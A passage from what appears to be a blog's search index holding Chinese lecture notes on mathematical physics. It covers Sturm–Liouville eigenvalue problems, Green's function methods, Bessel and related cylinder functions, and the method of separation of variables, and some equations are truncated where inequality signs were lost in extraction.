\\dd{x}. \\tag{2} \\label{eq-16-2}\\end{equation}$自伴算符本征值问题的基本性质前提是自伴算符的本粧值问题是否有解?需要区别正则的与奇异的两种情形: 如果算符的定义域是无界或半无界区间, 或者区间的端点是方程的奇点, 则此本征值问题是奇异的, 否则就属于正则的本征值问题.在可分的 Hilbert 空间内, 正则的自律算符本征值问题一定有解, 而且本征值是离散的 (因而构成可数集).对于奇异的自伴算符, 其本征值问题则不一定有解, 即使有解, 也可能是连续谱, 或者离散谱与连续谱二者兼而有之.在自伴算符本征值问题有解的前提下, 求得的本征值与本征函数具有下列性质:(1)自伴算符的本征值必为实数.(2)自伴算符的本征函数具有正交性, 即对应不同本征值的本征函数一定正交.(3)自伴算符的本征函数 (的全体) 构成一个完备函数组, 即任意一个在区间 $\\comm{a}{b}$ 中有连续二阶导数, 旦满足和自伴算符 $\\hat{L}$ 相同的边界条件的函数 $f\\qty(x)$, 均可按本征函数 $\\qty{y_n\\qty(x)}$ 展开为绝对而且一致收敛的级数$\\begin{equation} f\\qty(x) = \\sum_{n = 1}^{\\infty} c_n y_n\\qty(x), \\tag{3a} \\label{eq-16-3a}\\end{equation}$其中$\\begin{equation} c_n = \\frac{\\int_a^b f\\qty(x) y_n^*\\qty(x) \\dd x}{\\int_a^b y_n\\qty(x) y_n^*\\qty(x) \\dd x}. \\tag{3b} \\label{eq-16-3b}\\end{equation}$上述展开条件还可以放宽为: 对于在 $\\comm{a}{b}$ 中平方可积的任意函数, $\\eqref{eq-16-3a}$ 在平均收敛$\\begin{equation} \\lim_{N \\to \\infty} \\int_a^b \\abs{f\\qty(x) - \\sum_{n = 1}^N c_n y_n\\qty(x)}^2 \\dd x = 0 \\tag{3c} \\label{eq-16-3c}\\end{equation}$的意义下仍然成立, 其展开系数仍为 $\\eqref{eq-16-3c}$.Sturm – Liouville 型方程的本征值问题1.Sturm -– Liouville 型方程$\\dv{x}\\qty[p\\qty(x) \\dv{y}{x}] + \\qty[\\lambda \\rho\\qty(x) - q\\qty(x)] y = 0 \\qc a 在边界条件$\\eval{p\\qty(x) \\qty(y_1^* \\dv{y_2}{x} - y_2 \\dv{y_1^*}{x})}_a^b = 0\\nonumber$下构成自伴算符的本征值问题, 其中 $\\lambda$ 为参数, $\\rho\\qty(x)$ 为权函数.使此问题有非零解的 $\\lambda$ 值称为本征值, 相应的非零解称为本征函数 (以下相同).在常见的 Sturm – Liouville 型方程中, $p\\qty(x)$, $q\\qty(x)$ 和 $\\rho\\qty(x)$ 均满足以下条件: $p\\qty(x) \\geqslant 0$, 但不恒为 0, 并且只在边界点 ($a$, 或 $b$, 或 $a$ 和 $b$) 可能为 0. $\\rho\\qty(x) \\geqslant 0$, 但不恒为 0. $q\\qty(x) \\geqslant 0$, 且 $q\\qty(x) / p \\qty(x)$ 在 $\\comm{a}{b}$ 中, 除 $a$, $b$ 两点可能是不超过二阶的极点外, 是实的连续函数.Sturm – Liouville 型方程本征值问题的基本类型与第一、二、三类边界条件构成的本征值问题$$\\begin{gather*} \\dv{x}\\qty[p\\qty(x) \\dv{y\\qty(x)}{x}] + \\qty[\\lambda \\rho\\qty(x) - \\qty(x)] y\\qty(x) = 0 \\qc x \\in \\qty(a, b), \\\\ \\alpha_1 y'\\qty(a) - \\beta_1 y\\qty(a) = 0 \\qc \\alpha_2 y'\\qty(b) + \\beta_2 y\\qty(b) = 0,\\end{gather*}$$其中 $\\alpha_1$, $\\beta_1$, $\\alpha_2$, $\\beta_2$ 均为非负常数, 且 $\\alpha_1$, $\\beta_1$ 不同时为零, $\\alpha_2$, $\\beta_2$ 不同时为零.存在有界条件时的本征值问题例如,$\\begin{gather*} \\dv{x}\\qty[p\\qty(x) \\dv{y\\qty(x)}{x}] + \\qty[\\lambda \\rho\\qty(x) - q\\qty(x)] y\\qty(x) \\qc x \\in \\qty(a, b), \\\\ y\\qty(a) ~ \\text{有界} \\qc \\alpha_2 y'\\qty(b) + \\beta_2 y\\qty(b) = 0.\\end{gather*}$出现此类本征值问题的前提条件是 $p\\qty(a) = 0$, $x = a$ 是方程的正则奇点, 且方程在 $x = a$ 点有一个解是发散的, 这是需加入一个有界条件, 将此解剔除.若 $p\\qty(b) = 0$ 或 $p\\qty(a) = p\\qty(b) = 0$, 可做类似处理.存在周期条件时的本征值问题$$\\begin{gather*} \\dv{x}\\qty[p\\qty(x) \\dv{y\\qty(x)}{x}] + \\qty[\\lambda \\rho\\qty(x) - q\\qty(x)] y\\qty(x) = 0 \\qc x \\in \\qty(a, b), \\\\ y\\qty(a) = y\\qty(b) \\qc y'\\qty(a) = y'\\qty(b).\\end{gather*}$$出现此本征值问题的条件是 $p\\qty(a) = p\\qty(b)$, $q\\qty(a) = q\\qty(b)$, $\\rho\\qty(a) = \\rho\\qty(b)$.几种常见的 Sturm – Liouville 型方程$X''\\qty(x) + \\lambda X\\qty(x)= 0$ 或 $\\Phi''\\qty(\\phi) + \\mu \\Phi\\qty(\\phi) = 0$在这类方程中, $p\\qty(x) = 1$, $q\\qty(x) = 0$, 权函数 $\\rho\\qty(x) = 1$, 两方程中的待定参数为 $\\lambda$ 或 $\\mu$.Bessel 方程$$\\frac{1}{r} \\dv{r}\\qty[r \\dv{R\\qty(r)}{r}] + \\qty(k^2 - \\frac{m^2}{r^2}) R\\qty(r) = 0,\\nonumber$$在此方程中, $p\\qty(r) = r$, $q\\qty(r) = \\frac{m^2}{r}$, 权函数 $\\rho\\qty(r) = r$, 参数为 $k^2$.球 Bessel 方程$$\\frac{1}{r^2} \\dv{r}\\qty[r^2 \\dv{R\\qty(r)}{r}] + \\qty[k^2 - \\frac{l \\qty(l + 1)}{r^2}] R\\qty(r) = 0,\\nonumber$$在此方程中, $p\\qty(r) = r^2$, $q\\qty(r) = l \\qty(l + 1)$, 权函数 $\\rho\\qty(r) = r^2$, 参数为 $k^2$.连带 Legendre 方程$$\\frac{1}{\\sin\\theta} \\dv{\\theta}\\qty[\\sin\\theta \\dv{\\Theta\\qty(\\theta)}{\\theta}] + \\qty(\\lambda - \\frac{m^2}{\\sin[2]{\\theta}}) \\Theta\\qty(\\theta) = 0,\\nonumber$$在此方程中, $p\\qty(\\theta) = \\sin\\theta$, $q\\qty(\\theta) = \\frac{m^2}{\\sin\\theta}$, 权函数 $\\rho\\qty(\\theta) = \\sin\\theta$, 参数为 $\\lambda$.做变换 $\\cos\\theta = x$, $\\Theta\\qty(\\theta) = y\\qty(x)$ 可得到连带 Legendre 方程的另一个标准形式$\\dv{x}\\qty[\\qty(1 - x^2) \\dv{y}{x}] + \\qty(\\lambda - \\frac{m^2}{1 - x^2}) = 0,\\nonumber$这时 $p\\qty(x) = 1 - x^2$, $q\\qty(x) = \\frac{m^2}{1 - x^2}$, 权函数 $\\rho\\qty(x) = 1$, 参数仍为 $\\lambda$.Sturm – Liouville 型方程本征值问题的退化现象在边界条件$\\eval{p\\qty(x) \\qty(y_1^* \\dv[2]{y_2}{x} - y_2 \\dv[2]{y_1^*}{x})}_a= \\eval{p\\qty(x) \\qty(y_1^* \\dv[2]{y_2}{x} - y_2 \\dv[2]{y_1^*}{x})}_b= 0\\nonumber$下, Sturm – Liouville 型方程$\\dv{x}\\qty[p\\qty(x) \\dv{y}{x}] + \\qty[\\lambda \\rho\\qty(x) - q\\qty(x)] = 0 \\qc a 的本征值问题是非退化的, 即对应于一个本征值, 只有一个本征函数; 只在周期条件下, 对应于一个本征值, 才可能有两个本征函数; 这两个本征函数可能正交, 也可能不正交, 但是通过正交化步骤, 总可以将对应于同一本征值的两个本征函数正交化." }, { "title": "第十八章 Green 函数方法", "url": "/course-notes/mathematical-physics-equations/2022/06/08/%E7%AC%AC%E5%8D%81%E5%85%AB%E7%AB%A0-green%E5%87%BD%E6%95%B0%E6%96%B9%E6%B3%95/", "categories": "Course Notes, Mathematical Physics Equations", "tags": "untagged", "date": "2022-06-08 00:00:00 +0800", "snippet": "稳定问题的 Green 函数对于 Poisson 方程的定解问题$$\\begin{gather} \\laplacian{u} = \\rho \\qc r \\in V, \\tag{1a} \\label{eq-18-1a} \\\\ \\qty(\\alpha u + \\beta \\pdv{u}{n})_{\\Sigma} = f\\qty(\\Sigma), \\tag{1b} \\label{eq-18-1b}\\end{gather}$$其 Green 函数 $G\\qty(\\vb{r}; \\vb{r}')$ 是点源问题$\\begin{equation} \\laplacian G\\qty(\\vb*{r}; \\vb*{r}') = - \\delta\\qty(\\vb*{r} - \\vb*{r}') \\qc \\vb*{r}, \\vb*{r}' \\in V \\tag{2a} \\label{eq-18-2a}\\end{equation}$在齐次边界条件$\\begin{equation} \\qty(\\alpha G + \\beta \\pdv{G}{n})_{\\Sigma} = 0 \\tag{2b} \\label{eq-18-2b}\\end{equation}$下的解. 这里需约定 $\\alpha \\neq 0$. 当 $\\alpha = 0$ (第二类边界条件) 时, 需另行定义广义 Green 函数.对于 Helmholtz 方程的定解问题$$\\begin{gather} \\laplacian u + k^2 u = \\rho \\qc r \\in V, \\tag{3a} \\label{eq-18-3a} \\\\ \\qty(\\alpha u + \\beta \\pdv{u}{n})_{\\Sigma} = f\\qty(\\Sigma), \\tag{3b} \\label{eq-18-3b}\\end{gather}$$其 Green 函数 $G\\qty(\\vb{r}; \\vb{r}')$ 也是非齐次偏微分方程$\\begin{equation} \\laplacian G\\qty(\\vb*{r}; \\vb*{r}') + k^2 G\\qty(\\vb*{r}; \\vb*{r}') = - \\delta\\qty(\\vb*{r} - \\vb*{r}') \\qc \\vb*{r}, \\vb*{r}' \\in V \\tag{4a} \\label{eq-18-4a}\\end{equation}$在齐次边界条件$\\begin{equation} \\qty(\\alpha G + \\beta \\pdv{G}{n})_{\\Sigma} = 0 \\tag{4b} \\label{eq-18-4b}\\end{equation}$下的解.Green 函数 $G\\qty(\\vb{r}; \\vb{r}')$ 的基本性质$G\\qty(\\vb{r}; \\vb{r}')$ 的奇异性$\\vb{r} = \\vb{r}'$ 是 $G\\qty(\\vb{r}; \\vb{r}')$ 的奇点, 但具体的奇异行为随空间维数而异.$G\\qty(\\vb{r}; \\vb{r}')$ 的对称性当 $G\\qty(\\vb{r}; \\vb{r}')$ 满足定解问题 $\\eqref{eq-18-4a}$, $\\eqref{eq-18-4b}$ 时, 则具有对称性:$G\\qty(\\vb*{r}; \\vb*{r}') = G\\qty(\\vb*{r}'; \\vb*{r}).\\nonumber$解偏微分方程定解问题的 Green 函数方法对于定解问题 $\\eqref{eq-18-1a}$, $\\eqref{eq-18-1b}$ 或 $\\eqref{eq-18-3a}$, $\\eqref{eq-18-3b}$, 均有解$u\\qty(r) = - \\iiint_V G\\qty(\\vb*{r}; \\vb*{r}') \\rho\\qty(\\vb*{r}') \\dd{\\vb*{r}'} - \\frac{1}{\\alpha} \\iint_{\\Sigma} f\\qty(\\Sigma') \\eval{\\pdv{G\\qty(\\vb*{r}; \\vb*{r}')}{n'}}_{\\Sigma'} \\dd\\Sigma',\\tag{5} \\label{eq-18-5}$其中 $G\\qty(\\vb{r}; \\vb{r}')$ 是定解问题 $\\eqref{eq-18-2a}$, $\\eqref{eq-18-2b}$ 或 $\\eqref{eq-18-4a}$, $\\eqref{eq-18-4b}$ 的解.波动方程的 Green 函数以一维有界区间内的波动方程定解问题$\\begin{align} & \\pdv[2]{u}{t} - a^2 \\pdv[2]{u}{x} = f\\qty(x, t), & & & & 0 0, \\tag{6a} \\label{eq-18-6a} \\\\ & \\eval{u}_{x = 0} = \\mu\\qty(t), & & \\eval{u}_{x = l} = \\nu\\qty(t), & & t > 0, \\tag{6b} \\label{eq-18-6b} \\\\ & \\eval{u}_{t = 0} = \\phi\\qty(x), & & \\eval{\\pdv{u}{t}}_{t = 0} = \\psi\\qty(x), & & 0 为例, 其 Green 函数 $G\\qty(x, t; x', t')$ 是瞬时 (仅存在于某一时刻) 点 (仅存在于空间某点) 源问题$\\qty(\\pdv[2]{t} - a^2 \\pdv[2]{x}) G\\qty(x, t; x', t') = \\delta\\qty(x - x') \\delta\\qty(t - t') \\qc x 0\\tag{7a} \\label{eq-18-7a}$在齐次定解条件$\\begin{align} & \\eval{G\\qty(x, t; x', t')}_{x = 0} = 0, & & \\eval{G\\qty(x, t; x', t')}_{x = l} = 0, & & t, t' > 0, \\tag{7b} \\label{eq-18-7b} \\\\ & \\eval{G\\qty(x, t; x', t')}_{t 下的解. 去掉定解问题 $\\eqref{eq-18-7a}$, $\\eqref{eq-18-7b}$, $\\eqref{eq-18-7c}$ 中的限制条件 $t, t' &gt; 0$, 也就是将 Green 函数 $G\\qty(x, t; x', t')$ 的定义域延拓为 $-\\infty &lt; t, t' &lt; \\infty$, 则 $G\\qty(x, t; x', t')$ 具有空间变量的对称性和时间变量的倒易性$G\\qty(x, t; x', t') = G\\qty(x', -t'; x, -t).\\nonumber$可以用此 Green 函数 $G\\qty(x, t; x', t')$ 表示出定解问题 $\\eqref{eq-18-7a}$, $\\eqref{eq-18-7b}$, $\\eqref{eq-18-7c}$ 的解$\\begin{eqnarray} u\\qty(x, t) & = & \\int_0^l \\dd{x} \\int_0^t G\\qty(x, t; x', t') f\\qty(x', t') \\dd{t'} \\nonumber \\\\ & & + \\int_0^l \\qty[\\eval{G\\qty(x, t; x', 0) \\psi\\qty(x') - \\phi\\qty(x') \\pdv{G\\qty(x, t; x', t')}{t'}}_{t' = 0}] \\dd{x'} \\nonumber \\\\ & & - a^2 \\int_0^t \\qty[\\nu\\qty(t') \\eval{\\pdv{G\\qty(x, t; x', t')}{x'}}_{x' = l} - \\mu\\qty(t') \\eval{\\pdv{G\\qty(x, t; x', t')}{x'}}_{x' = 0}] \\dd{t'}. \\tag{8} \\label{eq-18-8}\\end{eqnarray}$热传导问题也可类似地讨论.Green 函数的求法Green 函数满足的是非齐次方程、齐次定解条件的定解问题, 因此可以用按相应齐次问题本征函数展开法求解, 也可用积分变换法求解; 另一方面, 由于出现的是特殊的非齐次项 (点源或瞬时点源, 数学形式为 $\\delta$ 函数), 故又有一些特殊的解法, 如电像法." }, { "title": "第十五章 柱函数", "url": "/course-notes/mathematical-physics-equations/2022/06/08/%E7%AC%AC%E5%8D%81%E4%BA%94%E7%AB%A0-%E6%9F%B1%E5%87%BD%E6%95%B0/", "categories": "Course Notes, Mathematical Physics Equations", "tags": "untagged", "date": "2022-06-08 00:00:00 +0800", "snippet": "Bessel 方程的来源Helmholtz 方程在柱坐标系下分离变量, 可得$\\begin{equation} \\frac{1}{r} \\dv{r}(r \\dv{R}{r}) + \\qty(\\lambda - \\frac{\\nu^2}{r^2}) R = 0, \\tag{1} \\label{eq-15-1}\\end{equation}$当 $\\lambda \\neq 0$ 时, 做变换 $x = \\sqrt{\\lambda} r$, $y\\qty(x) = R\\qty(r)$, 即可化为 Bessel 方程$\\begin{equation} \\frac{1}{x} \\dv{x}(x \\dv{y}{x}) + \\qty(1 - \\frac{\\nu^2}{x^2}) y = 0. \\tag{2} \\label{eq-15-2}\\end{equation}$不妨假设 $\\Re{\\nu} \\geqslant 0$. 在通常情形下 $\\nu$ 为整数或半奇数, 此时更可设 $\\nu \\geqslant 0$.Bessel 方程的解有$$\\begin{align} \\mathrm{J}_{\\pm\\nu}\\qty(x) & = \\sum_{k = 0}^{\\infty} \\frac{\\qty(-1)^k}{k! \\Gamma\\qty(k \\pm \\nu + 1)} \\qty(\\frac{x}{2})^{2 k \\pm \\nu}, \\tag{3a} \\label{eq-15-3a} \\\\ \\mathrm{N}_{\\nu}\\qty(x) & = \\frac{\\cos{\\nu \\pi} \\mathrm{J}_{\\nu}\\qty(x) - \\mathrm{J}_{-\\nu}\\qty(x)}{\\sin\\qty(\\nu\\pi)}, \\tag{3b} \\label{eq-15-3b} \\\\ \\mathrm{H}_{\\nu}^{\\qty(1)}\\qty(x) & \\equiv \\mathrm{J}_{\\nu}\\qty(x) + i \\mathrm{N}_{\\nu}\\qty(x), \\tag{3c} \\label{eq-15-3c} \\\\ \\mathrm{H}_{\\nu}^{\\qty(2)}\\qty(x) & \\equiv \\mathrm{J}_{\\nu}\\qty(x) - i \\mathrm{N}_{\\nu}\\qty(x), \\tag{3d} \\label{eq-15-3d}\\end{align}$$当 $\\nu \\neq$ 整数时, $\\mathrm{J}{\\nu}\\qty(x)$, $\\mathrm{J}{-\\nu}\\qty(x)$, $\\mathrm{N}{\\nu}\\qty(x)$ 两两线性无关, 故 Bessel 方程的通解可取为$y\\qty(x) = c_1 \\mathrm{J}_{\\nu}\\qty(x) + c_2 \\mathrm{J}_{-\\nu}\\qty(x)\\qory\\qty(x) = c_1 \\mathrm{J}_{\\nu}\\qty(x) + c_2 \\mathrm{N}_{\\nu}\\qty(x).\\nonumber$当 $\\nu =$ 整数 $n$ 时, $\\mathrm{J}_n\\qty(x)$ 与 $\\mathrm{J}{-n}\\qty(x)$ 线性相关,$\\mathrm{J}_{-n}\\qty(x) = \\qty(-1)^n \\mathrm{J}_n\\qty(x).\\nonumber$故 Bessel 方程的通解须取为$y\\qty(x) = c_1 \\mathrm{J}_n\\qty(x) + c_2 \\mathrm{N}_n\\qty(x),\\nonumber$其中$\\begin{eqnarray} \\mathrm{N}_n\\qty(x) & = & \\lim_{\\nu \\to n} \\mathrm{N}_{\\nu}\\qty(x) \\nonumber \\\\ & = & \\frac{2}{\\pi} \\mathrm{J}_n\\qty(x) \\ln\\frac{x}{2} - \\frac{1}{\\pi} \\sum_{k = 0}^{n - 1} \\frac{\\qty(n - k - 1)!}{k!} \\qty(\\frac{x}{2})^{2 k - n} \\nonumber \\\\ & & - \\frac{1}{\\pi} \\sum_{k = 0}^{\\infty} \\frac{\\qty(-1)^k}{k! \\qty(n + k)!} \\qty(\\frac{x}{2})^{2 k + n} \\qty[\\Psi\\qty(n + k + 1) + \\Psi\\qty(k + 1)]. \\tag{4} \\label{eq-15-4}\\end{eqnarray}$柱函数凡满足递推关系$\\begin{align} & \\dv{x}\\qty[x^{\\nu} C_{\\nu}\\qty(x)] = x^{\\nu} C_{\\nu - 1}\\qty(x), \\tag{5a} \\label{eq-15-5a} \\\\ & \\dv{x}\\qty[x^{-\\nu} C_{\\nu}\\qty(x)] = - x^{-\\nu} C_{\\nu + 1}\\qty(x) \\tag{5b} \\label{eq-15-5b}\\end{align}$的函数 $\\qty{C_{\\nu}\\qty(x)}$ 统称为柱函数. Bessel 函数是第一类柱函数, Neumann 函数是第二类柱函数, Hankel 函数则是第三类柱函数.柱函数一定是 Bessel 方程的解.由 Bessel 方程及柱函数的递推关系, 当 $\\Re{v} \\geqslant 0$ 时可求得$\\begin{equation} \\begin{split} \\int^x C_{\\nu}^2\\qty(x) x \\dd{x} & = \\frac{1}{2} x^2 \\qty[C_{\\nu}^2\\qty(x) + C_{\\nu + 1}^2\\qty(x)] - \\nu x C_{\\nu}\\qty(x) C_{\\nu + 1}\\qty(x) \\\\ & = \\frac{1}{2} x^2 \\qty[C_{\\nu}^2\\qty(x) + C_{\\nu}'^2\\qty(x)] - \\frac{1}{2} \\nu^2 C_{\\nu}^2\\qty(x). \\end{split} \\tag{6} \\label{eq-15-6}\\end{equation}$此结果可用于计算本征函数为柱函数时的模方.整数阶 Bessel 函数的生成函数和积分表示$$\\begin{gather} \\exp\\bqty{\\frac{x}{2} \\pqty{t - \\frac{1}{t}}} = \\sum_{n = -\\infty}^{\\infty} \\mathrm{J}_n\\pqty{x} t^n \\qc 0 柱函数的渐近展开当 $x \\to 0$ 时,$\\begin{align} \\mathrm{J}_{\\nu}\\qty(x) & \\sim \\frac{1}{\\Gamma\\qty(\\nu + 1)} \\qty(\\frac{x}{2})^{\\nu}, \\tag{9a} \\label{eq-15-9a} \\\\ \\mathrm{N}_{\\nu}\\qty(x) & \\sim - \\frac{\\Gamma\\qty(\\nu)}{\\pi} \\qty(\\frac{x}{2})^{-\\nu}, \\tag{9b} \\label{eq-15-9b} \\\\ \\mathrm{N}_0\\qty(x) & \\sim \\frac{2}{\\pi} \\ln\\frac{x}{2}. \\tag{9c} \\label{eq-15-9c}\\end{align}$当 $x \\to \\infty$ 时,$\\begin{align} \\mathrm{J}_{\\nu}\\pqty{x} & \\sim \\sqrt{\\frac{2}{\\pi x}} \\cos(x - \\frac{\\nu \\pi}{2} - \\frac{\\pi}{4}), & \\vqty{\\arg{x}} & 在此基础上, 可进一步推出 Hankel 函数的渐近展开.Bessel 方程的本征值问题因为方程 $\\eqref{eq-15-1}$ 经适当变换后即可化为 Bessel 方程 $\\eqref{eq-15-2}$, 故方程 $\\eqref{eq-15-1}$ 配以适当的边界条件即构成 Bessel 方程的本征值问题. 常见的有下列两种类型:柱内问题此时边界条件为$\\begin{align*} & R\\qty(0) ~ \\text{有界}, \\\\ & \\qty[\\alpha R\\qty(r) + \\beta \\dv{R\\qty(r)}{r}]_{r = a} = 0.\\end{align*}$解之可得本征值 $\\lambda_i$ 是超越方程$\\alpha \\mathrm{J}_{\\nu}\\qty(\\sqrt{\\lambda} a) + \\beta \\sqrt{\\lambda} \\mathrm{J}_{\\nu}'\\qty(\\sqrt{\\lambda} a) = 0\\nonumber$的第 $i$ 个正根, $i = 1, 2, 3, \\dots$, 本征函数为$R_i\\qty(r) = \\mathrm{J}_{\\nu}\\qty(\\sqrt{\\lambda_i} r).\\nonumber$此本征函数组是区间 $\\comm{0}{a}$ 上的正交完备函数组, 权函数为 $r$.空心柱体内的定解问题此时边界条件为$\\begin{align*} & \\qty[\\alpha_1 R\\qty(r) + \\beta_1 \\dv{R\\qty(r)}{r}]_{r = a} = 0. \\\\ & \\qty[\\alpha_2 R\\qty(r) + \\beta_2 \\dv{R\\qty(r)}{r}]_{r = b} = 0.\\end{align*}$解之可得本征值 $\\lambda_i$ 是超越方程$\\begin{vmatrix} \\alpha_1 \\mathrm{J}_{\\nu}\\qty(\\sqrt{\\lambda} a) + \\beta_1 \\sqrt{\\lambda} \\mathrm{J}_{\\nu}'\\qty(\\sqrt{\\lambda} a) & \\alpha_1 \\mathrm{N}_{\\nu}\\qty(\\sqrt{\\lambda} a) + \\beta_1 \\sqrt{\\lambda} \\mathrm{N}_{\\nu}'\\qty(\\sqrt{\\lambda} a) \\\\ \\alpha_2 \\mathrm{J}_{\\nu}\\qty(\\sqrt{\\lambda} b) + \\beta_2 \\sqrt{\\lambda} \\mathrm{J}_{\\nu}'\\qty(\\sqrt{\\lambda} b) & \\alpha_2 \\mathrm{N}_{\\nu}\\qty(\\sqrt{\\lambda} b) + \\beta_2 \\sqrt{\\lambda} \\mathrm{N}_{\\nu}'\\qty(\\sqrt{\\lambda} b)\\end{vmatrix} = 0\\nonumber$的第 $i$ 个正根, $i = 1, 2, 3, \\dots$, 本征函数为$\\begin{eqnarray*} R_i\\qty(r) & = & \\qty[\\alpha_1 \\mathrm{N}_{\\nu}\\qty(\\sqrt{\\lambda_i} a) + \\beta_1 \\sqrt{\\lambda_i} \\mathrm{N}_{\\nu}'\\qty(\\sqrt{\\lambda_i} a)] \\mathrm{J}_{\\nu}\\qty(\\sqrt{\\lambda_i} r) \\\\ & & - \\qty[\\alpha_1 \\mathrm{J}_{\\nu}\\qty(\\sqrt{\\lambda_i} a) + \\beta_1 \\sqrt{\\lambda_i} \\mathrm{J}_{\\nu}'\\qty(\\sqrt{\\lambda_i} a)] \\mathrm{N}_{\\nu}\\qty(\\sqrt{\\lambda_i} r).\\end{eqnarray*}$此本征函数组是区间 $\\comm{a}{b}$ 上的正交完备函数组, 权函数仍为 $r$.虚宗量 Bessel 函数$$\\begin{align} & \\mathrm{I}_{\\nu}\\qty(x) \\equiv e^{- i \\nu \\pi / 2} \\mathrm{J}_{\\nu}\\qty(x e^{i \\pi / 2}) = \\sum_{k = 0}^{\\infty} \\frac{1}{k! \\Gamma\\qty(k + \\nu + 1)} \\qty(\\frac{x}{2})^{2 k + \\nu}, \\tag{11a} \\label{eq-15-11a} \\\\ & \\mathrm{K}_{\\nu}\\qty(x) = \\frac{\\pi}{2 \\sin{\\nu \\pi}} \\qty[I_{-\\nu}\\qty(x) - I_{\\nu}\\qty(x)], \\tag{11b} \\label{eq-15-11b}\\end{align}$$它们是虚宗量 Bessel 方程$\\frac{1}{x} \\dv{x}(x \\dv{y}{x}) - \\qty(1 + \\frac{m^2}{x^2}) y = 0\\nonumber$的解. 仍不妨假设 $\\Re{v} \\geqslant 0$.渐进行为当 $x \\to 0$ 时,$\\begin{equation} \\mathrm{I}_{\\nu}\\qty(x) ~ \\text{有界} \\qc \\mathrm{K}_{\\nu}\\qty(x) ~ \\text{无界}. \\tag{12a} \\label{eq-15-12a}\\end{equation}$当 $x \\to \\infty$ 时,$\\begin{equation} \\mathrm{I}_{\\nu}\\qty(x) \\sim \\sqrt{\\frac{1}{2 \\pi x}} e^x \\qc \\mathrm{K}_{\\nu}\\qty(x) \\sim \\sqrt{\\frac{\\pi}{2 x}} e^{-x}. \\tag{12b} \\label{eq-15-12b}\\end{equation}$半奇数阶 Bessel 函数$$\\begin{align} & x^{- n + 1 / 2} \\mathrm{J}_{- n + 1 / 2}\\qty(x) = \\qty(\\frac{1}{x} \\dv{x})^n \\sqrt{\\frac{2}{\\pi}} \\sin x, \\tag{13a} \\label{eq-15-13a} \\\\ & x^{- n - 1 / 2} \\mathrm{J}_{n + 1 / 2}\\qty(x) = \\qty(- \\frac{1}{x} \\dv{x})^n \\sqrt{\\frac{2}{\\pi}} \\frac{\\sin x}{x}. \\tag{13b} \\label{eq-15-13b}\\end{align}$$半奇数阶 Bessel 函数都是初等函数, 都是幂函数和三角函数的复合函数.球 Bessel 函数$$\\begin{align} \\mathrm{j}_l\\qty(x) & = \\sqrt{\\frac{\\pi}{2 x}} \\mathrm{J}_{l + 1 / 2}\\qty(x) = \\frac{\\sqrt{\\pi}}{2} \\sum_{n = 0}^{\\infty} \\frac{\\qty(-1)^n}{n! \\Gamma\\qty(n + l + \\frac{3}{2})} \\qty(\\frac{x}{2})^{2 n + l}, \\tag{14a} \\label{eq-15-14a} \\\\ \\mathrm{n}_l\\qty(x) & = \\qty(-1)^{l + 1} \\mathrm{j}_{- l - 1}\\qty(x) = \\sqrt{\\frac{\\pi}{2 x}} \\mathrm{N}_{l + 1 / 2}\\qty(x) \\tag{14b} \\label{eq-15-14b} \\\\ & = \\qty(-1)^{l + 1} \\frac{\\sqrt{\\pi}}{2} \\sum_{n = 0}^{\\infty} \\frac{\\qty(-1)^n}{n! \\Gamma\\qty(n - l + \\frac{1}{2})} \\qty(\\frac{x}{2})^{2 n - l - 1}, \\tag{14c} \\label{eq-15-14c}\\end{align}$$分别为 $l$ 阶球 Bessel 函数和球 Neumann 函数. 它们是球 Bessel 方程$\\frac{1}{x^2} \\dv{x}(x^2 \\dv{y}{x}) + \\qty[1 - \\frac{l \\qty(l + 1)}{x^2}] y\\qty(x) = 0\\nonumber$的解. 由球 Bessel 函数和球 Neumann 函数还可以定义球 Hankel 函数,$\\begin{align} \\mathrm{h}_l^{\\qty(1)} & = \\mathrm{j}_l\\qty(x) + i \\mathrm{n}_l\\qty(x), \\tag{15a} \\label{eq-15-15a} \\\\ \\mathrm{h}_l^{\\qty(2)} & = \\mathrm{j}_l\\qty(x) - i \\mathrm{n}_l\\qty(x). \\tag{15b} \\label{eq-15-15b}\\end{align}$Helmholtz 方程在球坐标系下分离变量得到的径向方程可以化为球 Bessel 方程.平面波按柱面波展开$$\\begin{equation} e^{i k r \\cos\\theta} = \\mathrm{J}_0\\qty(k r) + 2 \\sum_{n = 1}^{\\infty} i^n \\mathrm{J}_n\\qty(k r) \\cos{n \\theta}, \\tag{16} \\label{eq-15-16}\\end{equation}$$其中 $r$, $\\theta$ 均为柱坐标系中的坐标变量, 此平面波沿 $x$ 方向传播.平面波按球面波展开$$\\begin{equation} e^{i k r \\cos\\theta} = \\sum_{l = 0}^{\\infty} \\qty(2 l + 1) i^l \\mathrm{j}_l\\qty(k r) \\mathrm{P}_l\\qty(\\cos\\theta), \\tag{17} \\label{eq-15-17}\\end{equation}$$其中 $r$, $\\theta$ 均为球坐标系中的坐标变量, 次平面波沿 $z$ 方向传播." }, { "title": "第十二章 分离变量法", "url": "/course-notes/mathematical-physics-equations/2022/06/08/%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%88%86%E7%A6%BB%E5%8F%98%E9%87%8F%E6%B3%95/", "categories": "Course Notes, Mathematical Physics Equations", "tags": "untagged", "date": "2022-06-08 00:00:00 +0800", "snippet": "对含时间的 $n$ 维空间的齐次问题这里指的是 齐次方程 与 齐次边界条件 问题, 包括例如二维或三维热传导问题和波动问题. 偏微分方程是齐次的, 在空间 $n$ 个方向上的边界条件也都是齐次的, 它们可以是: 一、二、三类边界条件; 周期条件; 有界条件等.求解含时间的 $n$ 维空间齐次问题的主要步骤:分离变量用乘积形式的特解代入齐次偏微分方程和齐次边界条件, 分离出 $n$ 个关于空间变量的常微分方程和一个关于时间变量的常微分方程, 以及 $n$ 对齐次边界条件;$n + 1$ 个常微分方程中含有 $n$ 个待定参数;求解本征值问题$n$ 个关于空间的常微分方程与各自相应的齐次边界条件构成 $n$ 个本征值问题. 求出所有 $n$ 组本征值和本征函数;求特解并叠加成一般解把本征值代入关于时间变量的常微分方程中, 求时间函数的通解; 将 $n$ 个本征函数与时间函数连乘起来构成 (满足齐次偏微分方程和齐次边界条件的特解; 将所有特解叠加成一般解, 它是一个 $n$ 重求和的级数.确定叠加系数将一般解代入初值条件, 利用本征函数的正交完备性确定叠加系数而得解.稳定的 $n$ 维空间齐次问题由一个有 $n$ 个变数的齐次偏微分方程, $n - 1$ 组齐次边界条件构成的定解问题. 应能分出 $n - 1$ 个本征值问题, 剩余一个非齐次边界条件用来定系数. 求解步骤与上基本相同.原则上可以令未知函数为 $n$ 个函数之和, 每一个函数满足的定解问题都是由齐次方程及 $n - 1$ 